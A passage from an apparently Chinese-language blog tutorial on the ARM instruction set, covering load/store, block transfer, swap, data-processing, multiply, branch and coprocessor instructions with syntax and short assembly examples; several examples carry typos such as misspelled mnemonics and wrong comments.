为可选后缀，若指令有T，那么即使处理器是在特权模式下，存储系统也将访问看成是处理器是在用户模式下。T在用户模式下无效，不能与前索引偏移一起使用T。<br>​    LDR/STR 指令寻址是非常灵活的，由两部分组成，一部分为一个基址寄存器，可以为任一个通用寄存器，另一部分为一个地址偏移量。地址偏移量有以下3种格式：<br>​    (1) 立即数。立即数可以是一个无符号数值，这个数据可以加到基址寄存器，也可以从基址寄存器中减去这个数值。指令举例如下：<br>​    <code>LDR R1,[R0,#0x12] ;</code>将R0+0x12 地址处的数据读出，保存到R1中(R0 的值不变)<br>​    <code>LDR R1,[R0,#-0x12];</code>将R0-0x12 地址处的数据读出，保存到R1中(R0 的值不变)<br>​    <code>LDR R1,[R0] ;</code>将R0 地址处的数据读出，保存到R1 中(零偏移)<br>​    (2)寄存器。寄存器中的数值可以加到基址寄存器，也可以从基址寄存器中减去这个数值。指令举例值。指令举例如下：<br>​    <code>LDR R1,[R0,R2] ;</code>将R0+R2 地址的数据计读出，保存到R1中(R0 的值不变)<br>​    <code>LDR R1,[R0,-R2] ;</code>将R0-R2 地址处的数据计读出，保存到R1中(R0 的值不变)<br>​    (3)寄存器及移位常数。寄存器移位后的值可以加到基址寄存器，也可以从基址寄存器中减去这个数值。指令举例如下：<br>​    <code>LDR R1,[R0,R2,LSL #2] ;</code>将R0+R2<em>4地址处的数据读出，保存到R1中（R0，R2的值不变）<br>​    <code>LDR R1,[R0,-R2,LSL #2];</code>将R0-R2</em>4地址处的数据计读出，保存到R1中(R0，R2的值不变)<br>​    从寻址方式的地址计算方法分，加载/存储指令有以下4 种形式：<br>​    (1)零偏移。Rn 的值作为传送数据的地址，即地址偏移量为0。指令举例如下：<br>​    <code>LDR Rd,[Rn]</code><br>​    (2)前索引偏移。在数据传送之前，将偏移量加到Rn 中，其结果作为传送数据的存储地址。若使用后缀“！”，则结果写回到Rn中，且Rn 值不允许为R15。指令举例如下：<br>​    <code>LDR Rd,[Rn,#0x04]!</code><br>​    <code>LDR Rd,[Rn,#-0x04]</code><br>​    (3)程序相对偏移。程序相对偏移是索引形式的另一个版本。汇编器由PC 寄存器计算偏移量，并将PC寄存器作为Rn 生成前索引指令。不能使用后缀“！”。指令举例如下：<br>​    <code>LDR Rd,label ;</code>label 为程序标号，label 必须是在当前指令的±4KB范围内<br>​    (4) 后索引偏移。Rn 的值用做传送数据的存储地址。在数据传送后，将偏移量与Rn相加，结果写回到Rn中。Rn 不允许是R15。指令举例如下：<br>​    <code>LDR Rd,[Rn],#0x04</code><br>​    地址对准–大多数情况下，必须保证用于32 位传送的地址是32 位对准的。<br>​    加载/存储字和无符号字节指令举例如下：<br>​    <code>LDR R2,[R5] ;</code>加载R5 指定地址上的数据(字)，放入R2 中<br>​    <code>STR R1,[R0,#0x04] ;</code>将R1 的数据存储到R0+0x04存储单元，R0 值不变<br>​    <code>LDRB R3,[R2],#1 ;</code>读取R2 地址上的一字节数据，并保存到R3中，R2=R3+1<br>​    <code>STRB R6,[R7] ;</code>读R6 的数据保存到R7 指定的地址中，只存储一字节数据<br>​    加载/存储半字和带符号字节。这类LDR/STR 指令可能加载带符字节\加载带符号半字、加载/存储无符号半字。偏移量格式、寻址方式与加载/存储字和无符号字节指令相同。指令格式如下：<br>​    <code>LDR{cond}SB Rd,&lt;地址&gt; ;</code>加载指定地址上的数据(带符号字节)，放入Rd中<br>​    <code>LDR{cond}SH Rd,&lt;地址&gt; ;</code>加载指定地址上的数据(带符号字节)，放入Rd中<br>​    <code>LDR{cond}H Rd,&lt;地址&gt; ;</code>加载半字数据，放入Rd中，即Rd最低16位有效,高16位清零<br>​    <code>STR{cond}H Rd,&lt;地址&gt; ;</code>存储半字数据，要存储的数据在Rd，最低16位有效<br>​    说明：带符号位半字/字节加载是指带符号位加载扩展到32 位;无符号位半字加载是指零扩展到32位。<br>​    地址对准–对半字传送的地址必须为偶数。非半字对准的半字加载将使Rd 内容不可靠，非半字对准的半字存储将使指定地址的2字节存储内容不可靠。</p><p>​        加载/存储半字和带符号字节指令举例如下：</p><p>​       <code>LDRSB R1[R0,R3] ;</code>将R0+R3地址上的字节数据读出到R1，高24 位用符号位扩展<br>​        <code>LDRSH R1,[R9] ;</code>将R9 地址上的半字数据读出到R1，高16位用符号位扩展<br>​        <code>LDRH R6,[R2],#2 ;</code>将R2 地址上的半字数据读出到R6，高16位用零扩展，R2=R2+1<br>​       <code>SHRH R1,[R0,#2]!;</code>将R1 的数据保存到R2+2 地址中，只存储低2字节数据，R0=R0+2<br>​        LDR/STR 指令用于对内存变量的访问，内存缓冲区数据的访问、查表、外设的控制操作等等，若使用LDR 指令加载数据到PC 寄存器，则实现程序跳转功能，这样也就实现了程序散转。<br>​        变量的访问<br>​        NumCount EQU 0x40003000 ;定义变量NumCount<br>​        …<br>​        LDR R0,=NumCount ;使用LDR 伪指令装载NumCount的地址到R0<br>​        LDR R1,[R0] ;取出变量值<br>​        ADD R1,R1,#1 ;NumCount=NumCount+1<br>​        STR R1,[R0] ;保存变量值<br>​        …<br>​        GPIO 设置<br>​        GPIO-BASE EQU 0Xe0028000 ;定义GPIO 寄存器的基地址<br>​        …<br>​        LDR R0,=GPIO-BASE<br>​        LDR R1,=0x00FFFF00 ;装载32 位立即数，即设置值<br>​        STR R1,[R0,#0x0C] ;IODIR=0x00FFFF00， IODIR 的地址为0xE002800C<br>​        MOV R1,#0x00F00000<br>​        STR R1,[R0,#0x04] ;IOSET=0x00F00000，IOSET 的地址为0xE0028004<br>​        …<br>​        程序散转<br>​        …<br>​        MOV R2,R2,LSL #2 ;功能号乘上4，以便查表<br>​        LDR PC,[PC,R2] ;查表取得对应功能子程序地址，并跳转<br>​        NOP<br>​        FUN-TAB DCD FUN-SUB0<br>​        DCD FUN-SUB1<br>​        DCD FUN-SUB2<br>​        …</p><h4 id="LDM和STM"><a href="#LDM和STM" class="headerlink" title="LDM和STM"></a><strong>LDM和STM</strong></h4><p>​        批量加载/存储指令可以实现在一组寄存器和一块连续的内存单元之间传输数据。LDM为加载多个寄存器，STM 为存储多个寄存器。允许一条指令传送16 个寄存器的任何子集或所有寄存器。指令格式如下：<br>​        <code>LDM{cond}&lt;模式&gt; Rn{!},reglist{^}</code><br>​        <code>STM{cond}&lt;模式&gt; Rn{!},reglist{^}</code><br>​        LDM /STM 的主要用途是现场保护、数据复制、参数传送等。其模式有8种，如下所列：(前面4 种用于数据块的传输，后面4 种是堆栈操作)。<br>​        (1) IA：每次传送后地址加4<br>​        (2) IB：每次传送前地址加4<br>​        (3) DA：每次传送后地址减4<br>​        (4) DB：每次传送前地址减4<br>​        (5) FD：满递减堆栈<br>​        (6) ED：空递增堆栈<br>​        (7) FA：满递增堆栈<br>​        (8) EA：空递增堆栈<br>​        其中，寄存器Rn 为基址寄存器，装有传送数据的初始地址，Rn 不允许为R15;后缀“！”表示最后的地址写回到Rn中;寄存器列表reglist 可包含多于一个寄存器或寄存器范围，使用“,”分开，如{R1,R2,R6-R9},寄存器排列由小到大排列；“＾”后缀不允许在用户模式呈系统模式下使用，若在LDM 指令用寄存器列表中包含有PC 时使用，那么除了正常的多寄存器传送外，将SPSR 拷贝到CPSR 中，这可用于异常处理返回；使用“＾”后缀进行数据传送且寄存器列表不包含PC时，加载/存储的是用户模式的寄存器，而不是当前模式的寄存器。<br>​        地址对准――这些指令忽略地址的位[1：0]。<br>​        批量加载/存储指令举例如下：<br>​        <code>LDMIA R0!,{R3-R9} ;</code>加载R0 指向的地址上的多字数据，保存到R3～R9中，R0 值更新<br>​        <code>STMIA R1!,{R3-R9} ;</code>将R3～R9 的数据存储到R1 指向的地址上，R1值更新<br>​        <code>STMFD SP!,{R0-R7,LR} ;</code>现场保存，将R0～R7、LR入栈<br>​        <code>LDMFD SP!,{R0-R7,PC}^;</code>恢复现场，异常处理返回<br>​        在进行数据复制时，先设置好源数据指针，然后使用块拷贝寻址指令LDMIA/STMIA、LDMIB/STMIB、LDMDA/STMDA、LDMDB/STMDB 进行读取和存储。而进行堆栈操作时，则要先设置堆栈指针，一般使用SP 然后使用堆栈寻址指令STMFD/LDMFD、STMED。LDMED、STMFA/LDMFA、STMEA/LDMEA实现堆栈操作。<br>​        多寄存器传送指令示意图如图A-1所示，其中R1为指令执行前的基址寄存器，R1’则为指令执行完后的基址寄存器。</p><p>（a）指令STMIA R1!,{R5-R7}                                （b）指令STMIB R1!,{R5-R7}</p><p>（c）指令STMDA R1!, {R5-R7}                                （d）指令STMDB R1!,{R5-R7}<br>图A-1  多寄存器传送指令示意图</p><p>​        数据是存储在基址寄存器的地址之上还是之下，地址是在存储第一个值之前还是之后增加还是减少。表A-3给出多寄存器传送指令映射示意表。</p><p>表A-3  多寄存器传送指令映射示意表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用LDM/STM 进行数据复制例程如下：</span><br><span class="line">…</span><br><span class="line">LDR R0,=SrcData ;//设置源数据地址</span><br><span class="line">LDR R1,=DstData ;//设置目标地址</span><br><span class="line">LDMIA R0,&#123;R2-R9&#125; ;//加载8 字数据到寄存器R2～R9</span><br><span class="line">STMIA R1,&#123;R2-R9&#125; ;//存储寄存器R2～R9 到目标地址</span><br></pre></td></tr></table></figure><p>​        使用LDM/STM 进行现场寄存器保护，常在子程序中或异常处理使用：<br>​        SENDBYTE<br>​        STMFD SP!,{R0-R7,LR} ;寄存器入堆<br>​        …<br>​        BL DELAY ;调用DELAY 子程序<br>​        …<br>​        LDMFD SP!,{R0-R7,PC} ;恢复寄存器，并返回</p><h4 id="SWP"><a href="#SWP" class="headerlink" title="SWP"></a><strong>SWP</strong></h4><p>​        寄存器和存储器交换指令。SWP指令用于将一个内存单元（该单元地址放在寄存器Rn中）的内容读取到一个寄存器Rd中，同时将另一个寄存器Rm 的内容写入到该内存单元中。使用SWP 可实现信号量操作。<br>​        指令格式如下：<br>​       <code>SWP{cond}{B} Rd,Rm,[Rn]</code><br>​        其中，B 为可选后缀，若有B，则交换字节，否则交换32 位字：Rd 为数据从存储器加载到的寄存器;Rm的数据用于存储到存储器中，若Rm 与Rn 相同，则为寄存器与存储器内容进行交换;Rn 为要进行数据交换的存储器地址，Rn 不能与Rd 和Rm 相同。<br>​        SWP 指令举例如下：<br>​        SWP R1,R1,[R0] ; 将R1 的内容与R0 指向的存储单元的内容进行交换<br>​        SWP R1,R2,,[R0] ; 将R0 指向的存储单元内容读取一字节数据到R1中(高24 位清零)<br>​                                       ; 并将R2 的内容写入到该内存单元中(最低字节有效)<br>​        使用SWP 指令可以方便地进行信号量的操作：<br>​        12C_SEM EQU 0x40003000<br>​        …<br>​        12C_SEM_WAIT<br>​        MOV R0,#0<br>​        LDR R0,=12C_SEM<br>​        SWP R1,R1,[R0]        ;取出信号量，并设置其为0<br>​        CMP R1,#0            ;判断是否有信号<br>​        BEQ 12C_SEM_WAIT      ;若没有信号，则等待</p><h3 id="1-3-2-ARM-数据处理指令"><a href="#1-3-2-ARM-数据处理指令" class="headerlink" title="1.3.2.   ARM 数据处理指令"></a>1.3.2.   ARM 数据处理指令</h3><p>​        数据处理指令大致可分为3 类：</p><p>（1）     数据传送指令（如MOV、MVN）</p><p>（2）     算术逻辑运算指令（如ADD,SUM,AND）</p><p>（3）     比较指令（如CMP、TST）。</p><p>数据处理指令只能对寄存器的内容进行操作。        所有ARM 数据处理指令均可选择使用S 后缀，以影响状态标志。比较指令CMP、CMN、TST和TEQ不需要后缀S，它们会直接影响状态标志。ARM数据处理指令列于表A-4中。</p><p>表A-4  ARM 数据处理指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> （1）数据传送指令</span><br><span class="line">**MOV**</span><br><span class="line"> 数据传送指令。将8 位图立即数或寄存器(operant2)传送到目标寄存器Rd，可用于移位运算等操作。指令格式如下：</span><br><span class="line"> MOV&#123;cond&#125;&#123;S&#125; Rd,operand2</span><br><span class="line"> MOV 指令举例如下：</span><br><span class="line"> MOV R1#0x10 ;R1=0x10</span><br><span class="line"> MOV R0,R1 ;R0=R1</span><br><span class="line"> MOVS R3,R1,LSL #2 ;R3=R1＜＜2，并影响标志位</span><br><span class="line"> MOV PC,LR   ;PC=LR ，子程序返回</span><br></pre></td></tr></table></figure><h4 id="MVN"><a href="#MVN" class="headerlink" title="MVN"></a><strong>MVN</strong></h4><p>​        数据非传送指令。将8 位图立即数或寄存器(operand2)按位取反后传送到目标寄存器(Rd)，因为其具有取反功能，所以可以装载范围更广的立即数。指令格式如下：<br>​        <code>MVN{cond}{S} Rd,operand2</code><br>​        MVN 指令举例如下：<br>​        MVN R1,#0xFF ;R1=0xFFFFFF00<br>​        MVN R1,R2 ;将R2 取反，结果存到R1</p><p>​        （2）算术逻辑运算指令</p><h4 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a><strong>ADD</strong></h4><p>​        加法运算指令。将operand2 数据与Rn 的值相加，结果保存到Rd 寄存器。指令格式如下：<br>​        <code>ADD{cond}{S} Rd,Rn,operand2</code><br>​        ADD 指令举例如下：<br>​        ADDS R1,R1,#1 ;R1=R1+1<br>​        ADD R1,R1,R2 ;R1=R1+R2<br>​        ADDS R3,R1,R2,LSL #2 ;R3=R1+R2＜＜2</p><h4 id="SUB"><a href="#SUB" class="headerlink" title="SUB"></a><strong>SUB</strong></h4><p>​        减法运算指令。用寄存器Rn 减去operand2。结果保存到Rd 中。指令格式如下：<br>​        <code>SUB{cond}{S} Rd,Rn,operand2</code><br>​        SUB 指令举例如下：<br>​        SUBS R0,R0,#1 ;R0=R0-1<br>​        SUBS R2,R1,R2 ;R2=R1-R2<br>​        SUB R6,R7,#0x10 ;R6=R7-0x10</p><h4 id="RSB"><a href="#RSB" class="headerlink" title="RSB"></a><strong>RSB</strong></h4><p>​        逆向减法指令。用寄存器operand2 减法Rn，结果保存到Rd 中。指令格式如下：<br>​        <code>RSB{cond}{S} Rd,Rn,operand2</code><br>​        SUB 指令举例如下：<br>​        RSB R3,R1,#0xFF00 ;R3=0xFF00-R1<br>​        RSBS R1,R2,R2,LSL #2 ;R1=R2＜＜2-R2=R2×3<br>​        RSB R0,R1,#0 ;R0=-R1</p><h4 id="ADC"><a href="#ADC" class="headerlink" title="ADC"></a><strong>ADC</strong></h4><p>​        带进位加法指令。将operand2 的数据与Rn 的值相加，再加上CPSR中的C 条件标志位。结果保存到Rd 寄存器。指令格式如下：<br>​        <code>ADC{cond}{S} Rd,Rn,operand2</code><br>​        ADC 指令举例如下：<br>​        ADDS R0,R0,R2<br>​        ADC R1,R1,R3 ;使用ADC 实现64 位加法，(R1、R0)=(R1、R0)+（R3、R2）</p><h4 id="SBC"><a href="#SBC" class="headerlink" title="SBC"></a><strong>SBC</strong></h4><p>​        带进位减法指令。用寄存器Rn 减去operand2，再减去CPSR 中的C条件标志位的非（即若C 标志清零，则结果减去1），结果保存到Rd 中。指令格式如下：<br>​       <code>SCB{cond}{S}Rd,Rn,operand2</code><br>​        SBC 指令举例如下：<br>​        SUBS R0，R0，R2<br>​        SBC R1，R1，R3 ;使用SBC 实现64 位减法，(R1,R0)-(R3,R2)</p><h4 id="RSC"><a href="#RSC" class="headerlink" title="RSC"></a><strong>RSC</strong></h4><p>​        带进位逆向减法指令。用寄存器operand2 减去Rn，再减去CPSR 中的C条件标志位，结果保存到Rd 中。指令格式如下：<br>​       <code>RSC{cond}{S} Rd,Rn,operand2</code><br>​        RSC 指令举例如下：<br>​        RSBS R2,R0,#0<br>​        RSC R3,R1,#0 ;使用RSC 指令实现求64 位数值的负数</p><h4 id="AND"><a href="#AND" class="headerlink" title="AND"></a><strong>AND</strong></h4><p>​        逻辑与操作指令。将operand2 值与寄存器Rn 的值按位作逻辑与操作，结果保存到Rd中。指令格式如下：<br>​        <code>AND{cond}{S} Rd,Rn,operand2</code><br>​        AND 指令举例如下：<br>​        ANDS R0,R0,#x01 ;R0=R0&amp;0x01，取出最低位数据<br>​        AND R2,R1,R3 ;R2=R1&amp;R3</p><h4 id="ORR"><a href="#ORR" class="headerlink" title="ORR"></a><strong>ORR</strong></h4><p>​        逻辑或操作指令。将operand2 的值与寄存器Rn的值按位作逻辑或操作，结果保存到Rd 中。指令格式如下：<br>​        <code>ORR{cond}{S} Rd,Rn,operand2</code><br>​        ORR 指令举例如下：<br>​        ORR R0,R0,#x0F ;将R0 的低4 位置1<br>​        MOV R1,R2,LSR #4<br>​        ORR R3,R1,R3,LSL #8 ;使用ORR 指令将近R2 的高8位数据移入到R3 低8 位中</p><h4 id="EOR"><a href="#EOR" class="headerlink" title="EOR"></a><strong>EOR</strong></h4><p>​        逻辑异或操作指令。将operand2 的值与寄存器Rn 的值按位作逻辑异或操作，结果保存到Rd中。指令格式如下：<br>​        <code>EOR{cond}{S}Rd,Rn,operand2</code><br>​        EOR 指令举例如下：<br>​        EOR R1,R1,#0x0F ;将R1 的低4 位取反<br>​        EOR R2,R1,R0 ;R2=R1^R0<br>​        EORS R0,R5,#0x01 ;将R5 和0x01 进行逻辑异或，结果保存到R0，并影响标志位</p><h4 id="BIC"><a href="#BIC" class="headerlink" title="BIC"></a><strong>BIC</strong></h4><p>​        位清除指令。将寄存器Rn 的值与operand2 的值的反码按位作逻辑与操作，结果保存到Rd中。指令格式如下：<br>​        <code>BIC{cond}{S}Rd,Rn,operand2</code><br>​        BIC 指令举例如下：<br>​        BIC R1,R1,#0x0F ;将R1 的低4 位清零，其它位不变<br>​        BIC R1,R2,R3 ;将拭的反码和R2 相逻辑与，结果保存到R1</p><p>​        （3）比较指令</p><h4 id="CMP"><a href="#CMP" class="headerlink" title="CMP"></a><strong>CMP</strong></h4><p>​        比较指令。指令使用寄存器Rn 的值减去operand2 的值，根据操作的结果更新CPSR中的相应条件标志位，以便后面的指令根据相应的条件标志来判断是否执行。指令格式如下：<br>​        <code>CMP{cond} Rn,operand2</code><br>​        CMP 指令举例如下：<br>​        CMP R1,#10 ;R1 与10 比较，设置相关标志位<br>​        CMP R1,R2 ;R1 与R2 比较，设置相关标志位<br>​        CMP 指令与SUBS 指令的区别在于CMP 指令不保存运算结果。在进行两个数据大小判断时，常用CMP指令及相应的条件码来操作。</p><h4 id="CMN"><a href="#CMN" class="headerlink" title="CMN"></a><strong>CMN</strong></h4><p>​        负数比较指令。指令使用寄存器Rn 与值加上operand2 的值，根据操作的结果更新CPSR中的相应条件标志位，以便后面的指令根据相应的条件标志来判断是否执行，指令格式如下：<br>​        <code>CMN{cond} Rn,operand2</code><br>​        CMN R0,#1 ;R0+1,判断R0 是否为1 的补码，若是Z 置位<br>​        CMN 指令与ADDS 指令的区别在于CMN 指令不保存运算结果。CMN指令可用于负数比较，比如CMNR0，#1 指令则表示R0 与-1 比较，若R0 为-(即1 的补码)，则Z 置位，否则Z复位。</p><h4 id="TST"><a href="#TST" class="headerlink" title="TST"></a><strong>TST</strong></h4><p>​        位<a href="http://lib.csdn.net/base/softwaretest" target="_blank" rel="noopener">测试</a>指令。指令将寄存器Rn 的值与operand2 的值按位作逻辑与操作，根据操作的结果更新CPSR中相应的条件标志位(当结果为0时，EQ位被设置)，以便后面指令根据相应的条件标志来判断是否执行。指令格式如下：<br>​        <code>TST{cond} Rn,operand2</code><br>​        TST 指令举例如下：<br>​        TST R0,#0x01 ;判断R0 的最低位是否为0<br>​        TST R1,#0x0F ;判断R1 的低4 位是否为0<br>​        TST 指令与ANDS 指令的区别在于TST4 指令不保存运算结果。TST指令通常于EQ、NE条件码配合使用，当所有测试位均为0 时，EQ 有效，而只要有一个测试为不为0，则NE 有效。</p><h4 id="TEQ"><a href="#TEQ" class="headerlink" title="TEQ"></a><strong>TEQ</strong></h4><p>​        相等测试指令。指令寄存器Rn 的值与operand2 的值按位作逻辑异或操作，根据操作的结果更新CPSR中相应条件标志位，以便后面的指令根据相应的条件标志来判断是否执行。指令格式如下：<br>​        <code>TEQ{cond} Rn,operand2</code><br>​        TEQ 指令举例如下：<br>​        TEQ R0,R1 ;比较R0 与R1 是否相等(不影响V 位和C 位)<br>​        TST 指令与EORS 指令的区别在于TST 指令不保存运算结果。使用TEQ进行相等测试，常与EQNE 条件码配合使用，当两个数据相等时，EQ 有效，否则NE 有效。</p><p>（4）乘法指令<br>​        ARM7TDMI(-S)具有32×32 乘法指令、32×32 乘加指令、32×32结果为64 位的乘法指令。表A-5给出全部的ARM 乘法指令。</p><p>表A-5  全部的ARM 乘法指令</p><h4 id="MUL"><a href="#MUL" class="headerlink" title="MUL"></a><strong>MUL</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">32 位乘法指令。指令将Rm 和Rs 中的值相乘，结果的低32 位保存到Rd中。指令格式如下：</span><br><span class="line">MUL&#123;cond&#125;&#123;S&#125; Rd,Rm,Rs</span><br><span class="line">MUL 指令举例如下：</span><br><span class="line">MUL R1,R2,R3 ;R1=R2×R3</span><br><span class="line">MULS R0,R3,R7 ;R0=R3×R7，同时设置CPSR 中的N位和Z 位</span><br></pre></td></tr></table></figure><h4 id="MLA"><a href="#MLA" class="headerlink" title="MLA"></a><strong>MLA</strong></h4><p>​        32 位乘加指令。指令将Rm 和Rs 中的值相乘，再将乘积加上第3 个操作数，结果的低32位保存到Rd 中。指令格式如下：<br>​        <code>MLA{cond}{S} Rd,Rm,Rs,Rn</code><br>​        MLA 指令举例如下：<br>​        MLA R1,R2,R3,R0 ;R1=R2×R3+10</p><h4 id="UMULL"><a href="#UMULL" class="headerlink" title="UMULL"></a><strong>UMULL</strong></h4><p>​        64 位无符号乘法指令。指令将Rm 和Rs 中的值作无符号数相乘，结果的低32位保存到RsLo 中，而高32 位保存到RdHi 中。指令格式如下：<br>​        <code>UMULL{cond}{S} RdLo,RdHi,Rm,Rs</code><br>​        UMULL 指令举例如下：<br>​        UMULL R0,R1,R5,R8 ;(R1、R0)=R5×R8</p><h4 id="UMLAL"><a href="#UMLAL" class="headerlink" title="UMLAL"></a><strong>UMLAL</strong></h4><p>​        64 位无符号乘加指令。指令将Rm 和Rs 中的值作无符号数相乘，64 位乘积与RdHi、RdLo相加，结果的低32 位保存到RdLo 中，而高32 位保存到RdHi 中。指令格式如下：<br>​        <code>UMLAL{cond}{S} RdLo,RdHi,Rm,Rs</code><br>​        UMLAL 指令举例如下：<br>​        UMLAL R0,R1,R5,R8;(R1,R0)=R5×R8+(R1,R0)</p><h4 id="SMULL"><a href="#SMULL" class="headerlink" title="SMULL"></a><strong>SMULL</strong></h4><p>​        64 位有符号乘法指令。指令将Rm 和Rs 中的值作有符号数相乘，结果的低32位保存到RdLo 中，而高32 位保存到RdHi 中。指令格式如下：<br>​       <code>SMULL{cond}{S} RdLo,RdHi,Rm,Rs</code><br>​        SMULL 指令举例如下：<br>​        SMULL R2,R3,R7,R6 ;(R3,R2)=R7×R6</p><h4 id="SMLAL"><a href="#SMLAL" class="headerlink" title="SMLAL"></a><strong>SMLAL</strong></h4><p>​        64 位有符号乘加指令。指令将Rm 和Rs 中的值作有符号数相乘，64 位乘积与RdHi、RdLo，相加，结果的低32位保存到RdLo 中，而高32 位保存到RdHi 中。指令格式如下：<br>​       <code>SMLAL{cond}{S} RdLo,RdHi,Rm,Rs</code><br>​        SMLAL 指令举例如下：<br>​        SMLAL R2,R3,R7,R6;(R3,R2)=R7×R6+(R3,R2)</p><h3 id="1-3-3-ARM-跳转指令"><a href="#1-3-3-ARM-跳转指令" class="headerlink" title="1.3.3.   ARM 跳转指令"></a>1.3.3.   ARM 跳转指令</h3><p>​     两种方式可以实现程序的跳转：</p><p>（1）     使用跳转指令直接跳转，跳转指令有跳转指令B，带链接的跳转指令BL ，带状态切换的跳转指令BX。</p><p>（2）   直接向PC 寄存器赋值实现跳转。</p><p>表A-6给出全部的ARM跳转指令。</p><p>表A-6  ARM跳转指令</p><h4 id="B"><a href="#B" class="headerlink" title="B"></a><strong>B</strong></h4><p>​        跳转指令，跳转到指定的地址执行程序。</p><pre><code>`B{cond} label`举例如下：</code></pre><p>​       <code>B WAITA ;</code>跳转到WAITA 标号处</p><p>​       <code>B 0x1234 ;</code>跳转到绝对地址0x1234 处</p><p>​        跳转到指令B 限制在当前指令的±32Mb 的范围内。</p><h4 id="BL"><a href="#BL" class="headerlink" title="BL"></a><strong>BL</strong></h4><p>带链接的跳转指令。指令将下一条指令的地址拷贝到R14(即LR)链接寄存器中，然后跳转到指定地址运行程序。</p><p>​        BL{cond} label</p><p>​       举例如下：</p><p>​       BL DELAY</p><p>​        跳转指令B 限制在当前指令的±32MB 的范围内。BL 指令用于子程序调用。</p><h4 id="BX"><a href="#BX" class="headerlink" title="BX"></a><strong>BX</strong></h4><p>带状态切换的跳转指令。跳转到Rm 指定的地址执行程序，若Rm 的位[0]为1，则跳转时自动将CPSR 中的标志T 置位，即把目标地址的代码解释为Thumb代码;若Rm 的位[0]为0，则跳转时自动将CPSR 中的标志T 复位，即把目标地址的代码解释为ARM代码。指令格式如下：<br>​        BX{cond} Rm<br>​       举例如下：<br>​        ADRL R0,ThumbFun+1<br>​        BX R0 ;跳转到R0 指定的地址，并根据R0 的最低位来切换处理器状态</p><h4 id="BLX"><a href="#BLX" class="headerlink" title="BLX"></a>BLX</h4><p>​         BLX目标地址：跳转，改变状态及保存PC值</p><h3 id="1-3-4-ARM-协处理器指令"><a href="#1-3-4-ARM-协处理器指令" class="headerlink" title="1.3.4.   ARM 协处理器指令"></a>1.3.4.   ARM 协处理器指令</h3><p>5              ARM 支持协处理器操作，协处理器的控制要通过协处理器命令实现。表A-7给出全部的ARM协处理器指令。</p><p>表A-7  ARM 协处理器指令</p><h4 id="CDP"><a href="#CDP" class="headerlink" title="CDP"></a><strong>CDP</strong></h4><p>​    协处理器数据操作指令。ARM 处理器通过CDP 指令通知ARM 协处理器执行特定的操作。该操作由协处理器完成，即对命令的参数的解释与协处理器有关，指令的使用取决于协处理器。若协处理器不能成功地执行该操作，将产生未定义指令异常中断。指令格式如下：<br>​    <code>CDP{cond}coproc,opcodel,CRd,CRn,CRm{,opcode2}</code><br>​    其中： coproc 指令操作的协处理器名。标准名为pn,n 为0～15。<br>​    opcodel 协处理器的特定操作码。<br>​    CRd 作为目标寄存器的协处理器寄存器。<br>​    CRN 存放第1 个操作数的协处理器寄存器。<br>​    CRm 存放第2 个操作数的协处理器寄存器。<br>​    Opcode2 可选的协处理器特定操作码。<br>​    CDP 指令举例如下：<br>​    CDP p7,0,c0,c2,c3,0 ;协处理器7 操作，操作码为0，可选操作码为0<br>​    CDP p6,1,c3,c4,c5 ;协处理器操作，操作码为1</p><h4 id="LDC"><a href="#LDC" class="headerlink" title="LDC"></a><strong>LDC</strong></h4><p>​        协处理器数据读取指令。LDC指令从某一连续的内存单元将数据读取到协处理器的寄存器中。协处理器数据的数据的传送，由协处理器来控传送的字数。若协处理器不能成功地执行该操作，将产生未定义指令异常中断。指令格式如下：<br>​        <code>LDC{cond}{L} coproc,CRd,&lt;地址&gt;</code><br>​        其中： L 可选后缀，指明是长整数传送。<br>​        coproc 指令操作的协处理器名。标准名为pn，n 为0～15<br>​        CRd 作为目标寄存的协处理器寄存器。<br>​        &lt;地址&gt; 指定的内存地址<br>​        LDC 指令举例如下：<br>​        <code>LDC p5,c2,[R2,#4];</code>读取R2+4指向的内存单元的数据，传送到协处理器p5的c2寄存器中<br>​        <code>LDC p6,c2,[R1] ;</code>读取是指向的内存单元的数据，传送到协处理器p6的c2 寄存器中</p><h4 id="STC"><a href="#STC" class="headerlink" title="STC"></a><strong>STC</strong></h4><p>​        协处理器数据写入指令。STC指令将协处理器的寄存器数据写入到某一连续的内存单元中。进行协处理器数据的数据传送，由协处理器来控制传送的字数。若协处理器不能成功地执行该操作，将产生未定义指令异常中断。指令格式如下：<br>​       <code>STC{cond}{L} coproc,CRd,&lt;地址&gt;</code><br>​        其中： L 可选后缀，指明是长整数传送。<br>​        coproc 指令操作的协处理器名。标准名为pn，n 为0～15<br>​        CRd 作为目标寄存的协处理器寄存器。<br>​        &lt;地址&gt; 指定的内存地址<br>​        STC 指令举例如下：<br>​        STC p5,c1,[R0]<br>​        STC p5,c1,[Ro,#-0x04]</p><h4 id="MCR"><a href="#MCR" class="headerlink" title="MCR"></a><strong>MCR</strong></h4><p>​        ARM寄存器到协处理器寄存器的数据传送指令。MCR 指令将ARM 处理器的寄存器中的数据传送到协处理器的寄存器中。若协处理器不能成功地执行该操作，将产生未定义指令异常中断。指令格式如下：<br>​       <code>MCR{cond}coproc,opcodel,Rd,CRn,CRm{,opcode2}</code><br>​        其中：coproc 指令操作的协处理器名。标准名为pn，n 为0～15。<br>​        cpcodel 协处理器的特定操作码。<br>​        RD 作为目标寄存器。<br>​        CRn 存放第1 个操作数的协处理器寄存器<br>​        CRm 存放第2 个操作数的协处理器寄存器。<br>​        Opcode2 可选的协处理器特定操作码。<br>​        MCR 指令举例如下：<br>​        MCR p6,2,R7,c1,c2,<br>​        MCR P7,0,R1,c3,c2,1,</p><h4 id="MRC"><a href="#MRC" class="headerlink" title="MRC"></a><strong>MRC</strong></h4><p>​        协处理器寄存器到ARM寄存器到的数据传送指令。MRC 指令将协处理器寄存器中的数据传送到ARM 处理器的寄存器中。若协处理器不能成功地执行该操作。将产生未定义异常中断。指令格式如下：<br>​        <code>MRC 